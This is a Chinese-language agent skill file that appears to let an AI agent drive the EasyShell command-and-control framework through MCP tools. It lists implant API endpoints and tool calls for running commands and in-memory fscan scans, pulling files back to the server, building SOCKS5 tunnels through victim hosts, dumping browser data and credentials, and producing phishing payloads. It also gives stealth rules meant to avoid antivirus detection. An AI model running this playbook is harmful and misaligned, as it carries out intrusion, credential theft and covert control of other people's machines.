---
name: easyshell-real
description: >-
  EasyShell C2 实战 MCP 技能 — 基于 easyshell_server/Web 前端 API 实现。
  猥琐发育 / 文件 API 优先 / 内存执行 fscan / 一次一发 / 及时回收。
  用户提到 EasyShell MCP、TeamServer API、植入体控制、SOCKS5 隧道时使用。
---

# easyshell-real: EasyShell C2 实战标准操作

> **核心原则：** 猥琐发育，别浪。
>
> 每次会话 10–20s 结束，一次只做一件事。文件读写在可能时走 API（`/client/file/*`），
> 扫描类工具优先 `inline-bin` 内存执行，避免反复落盘。

---

## 零、环境与标识

```
API 前缀:     /prod-api/api
TeamServer:   http://127.0.0.1:8080  （按实际修改）
认证:         Authorization2: Bearer <JWT>
可选 Basic:   Authorization: Basic base64(user:pass)
植入体标识:   uid（字符串）
默认账号:     admin / 首次运行随机密码（见 logs 或控制台）
```

**关键 API 差异（历史 C2 迁移时注意）：**

| 项目 | 常见旧写法 | EasyShell |
|------|-----------|-----------|
| 客户端 ID | 数字 id | 字符串 uid |
| 认证头 | Basic + Token | JWT `Authorization2` |
| API 加密 | 无 | AES-GCM + RSA（MCP 已封装） |
| 读文件 | path + target 分离 | 完整路径 path |
| 命令执行 | 单接口同步 | sendcommand + getshellcontent 轮询 |
| 内存执行 | 无原生 | inline-bin / execute-assembly / BOF |

---

## 一、认证（MCP 自动处理）

```python
# easyshell_config.py 一键登录并写入 ~/.cursor/mcp.json
python easyshell_config.py --url http://127.0.0.1:8080 --password <pwd> --write-project
```

手动环境变量：

```
EASYSHELL_URL=http://127.0.0.1:8080
EASYSHELL_TOKEN=<JWT>
EASYSHELL_BASICAUTH=Basic YWRtaW46...   # 可选
```

> **血的教训：** 控制台 JSON API 必须加密；裸 POST 会 400「请求须使用加密格式」。用 MCP 工具或 `easyshell_api.py`。

---

## 二、响应格式

```python
# 成功
{"status": 200, "data": ...}

# 业务失败（HTTP 仍可能 200）
{"status": 400, "data": "错误描述"}

# 植入体离线
{"status": 503, "error": "该 UID 当前没有可用的传输会话..."}
```

---

## 三、API 端点速查

### 3.1 系统 / 客户端

| 端点 | 方法 | 用途 | 参数 |
|------|------|------|------|
| `/client/server-runtime` | GET | TeamServer 能力 | — |
| `/client/clientslist` | GET | 客户端列表 | `page`, `page_size` |
| `/client/shell/sendcommand` | POST | 下发命令 | `uid`, `command` |
| `/client/shell/getshellcontent` | GET | 轮询输出 | `uid` |
| `/client/shell/clearshellcontent` | POST | 清空缓冲区 | `uid` |

### 3.2 文件（优先用这些）

| 端点 | 方法 | 用途 | 请求体 |
|------|------|------|--------|
| `/client/file/tree` | POST | 列目录 | `{"uid":"...","dirPath":"C:/"}` |
| `/client/file/filecontent` | POST | 读文件 | `{"uid":"...","path":"C:/r.txt"}` |
| `/client/file/upload` | POST | 上传 multipart | `uid`, `uploadPath`, `file` |
| `/client/file/download` | POST | 下载到 C2 | `uid`, `filePath` |
| `/client/file/drives` | GET | 磁盘列表 | `uid` |

> **EasyShell 读文件：** `path` 传**完整路径**。

### 3.3 内存执行（Windows 后渗透利器）

| 端点 | 方法 | 请求体 |
|------|------|--------|
| `/plugin/memory-exec` | POST | `uid`, `relPath`, `mode`, `args`, `os` |
| `/bin/execute` | POST multipart | `uid`, `mode`, `file`, `args` |

**mode 取值：** `execute-assembly` | `inline-bin` | `shellcode-inject` | `inline-execute`

```python
# fscan 内存执行（不落盘）
easyshell_memory_exec(uid, "easyshell_plugins/tools/fscan.exe", "inline-bin", "-h 192.168.1.0/24 -np")
```

### 3.4 SOCKS5 隧道

| 端点 | 方法 | 请求体 |
|------|------|--------|
| `/socks5/list` | GET | `uid`, `page`, `page_size` |
| `/socks5/start` | POST | `uid`, `Socks5port`, `UserName`, `Password`, `Type` |
| `/socks5/close` | POST | 同上 |
| `/socks5/delete` | POST | 同上 |
| `/socks5/test` | POST | 连通性测试 |

> **隧道架构：** 端口在 TeamServer，**出口 IP = 植入体**。本机有直连路径时优先直连。

### 3.5 监听器

| 端点 | 方法 |
|------|------|
| `/listener/list` | GET |
| `/listener/add` | POST |
| `/listener/open` | POST |
| `/listener/close` | POST |

---

## 四、核心模式

### 模式 1：找在线植入体

```python
easyshell_list_clients(online_only=True)
# 取 UID 列，Online=="1" 为在线
```

HTTP Beacon / DNS 植入体 sleep 较大时需调 `/client/sleep` 或等回调。

### 模式 2：合并命令（一条 cmd）

```python
easyshell_exec_cmd(uid, 'cmd /c "whoami&ipconfig&systeminfo"')
```

### 模式 3：fscan 内存执行 + 读结果

```python
# 1. inline-bin 内存执行（输出在 shell 缓冲区）
easyshell_memory_exec(uid, "easyshell_plugins/tools/fscan.exe", "inline-bin", "-h 192.168.80.0/24 -np -o C:/r.txt")

# 2. 等 10–15s

# 3. API 读结果（不用 type）
easyshell_read_file(uid, "C:/r.txt")
```

### 模式 4：建 SOCKS5

```python
easyshell_start_socks5(uid, port=1080, force=True)
# 本机: curl --socks5 127.0.0.1:1080 http://目标/
```

---

## 五、猥琐发育原则

### ✅ 正确

```
1. 一次只发 1 个 API，等返回再发下一个
2. 小文件走 file/filecontent；大文件走 file/download
3. 扫描工具用 inline-bin，避免重复上传 exe
4. 命令合并：cmd /c "whoami&ipconfig"
5. 隧道 force=True 复用，不反复建
6. 会话控制在 10–20s
```

### ❌ 错误

```
1. 并行多个 sendcommand → 缓冲区乱、植入体压力大
2. shell type 读文件 → 多余 cmd 进程
3. fscan 不回收 / 反复上传 → 触发 AV
4. 以为 ping 通 = TCP 通 → 隧道打不通
5. 裸 HTTP 调 API → 加密校验失败
```

---

## 六、MCP 工具速查

```
# 诊断
easyshell_diagnose()

# 基础
easyshell_server_info()
easyshell_list_clients(online_only=True)
easyshell_set_sleep(uid, 3)

# Shell / 文件
easyshell_exec_cmd(uid, command)
easyshell_list_dir(uid, path)
easyshell_read_file(uid, path)
easyshell_list_drives(uid)
easyshell_upload_file(uid, local_path, remote_path)
easyshell_delete_file(uid, path)
easyshell_clear_shell(uid)

# 进程 / 插件
easyshell_list_processes(uid)
easyshell_memory_exec(uid, rel_path, mode, args)
easyshell_list_plugins(uid)
easyshell_list_script_plugins()

# 隧道
easyshell_start_socks5(uid, port=0, force=True)
easyshell_stop_socks5(uid, port)
easyshell_list_tunnels(uid)
easyshell_tunnel_test(uid, port)
easyshell_tunnel_curl(port, url)

# 后渗透
easyshell_search_sensitive(uid, path)
easyshell_list_sensitive(uid)
easyshell_read_sensitive(result_id)
easyshell_dump_browser(uid, wait_seconds=45)
easyshell_list_credentials(uid)

# 本机 HTTP（Nacos 等）
easyshell_send_http(url, headers="User-Agent: Nacos-Server")

# 监听器
easyshell_list_listeners()

# 载荷 / 钓鱼 / 分组
easyshell_gen_payload(...)
easyshell_gophish_build_attachment(...)
easyshell_batch_exec("uid1,uid2", "whoami")
```

完整 server/web API 映射见 [[easyshell-mcp]]、[[easyshell-payload]]。

---

## 八、钓鱼上线衔接

若初始访问来自 [[easyshell-phishing]] 载荷附件或 WebDelivery：

```python
# 1. 确认监听器与活动使用的一致
easyshell_list_listeners()

# 2. 等新 uid 出现
easyshell_list_clients(online_only=True)

# 3. 首回连：降 sleep、基础信息（合并一条）
easyshell_set_sleep(uid, 3)
easyshell_exec_cmd(uid, 'cmd /c "whoami&hostname&ipconfig"')

# 4. 进入内网流程 → [[easyshell-lateral]]
```

> 钓鱼模块管投递与统计；植入体控制仍走 `/client/*` API，勿混用 Gophish 代理路径。

---

## 七、项目结构参考

```
easyshell_server/   TeamServer + API（含邮件钓鱼模块）
easyshell_web/      Vue 控制台（/Gophish Hub）
easyshell_client/   Go/Rust 植入体（websocket/tcp/kcp/http/oss）
Extensions/         插件与 fscan 等工具（relPath 前缀 easyshell_plugins/）
```

**关联：** [[easyshell-phishing]] | [[easyshell-lateral]] | [[easyshell-pentest]] | [[easyshell-package/README]]
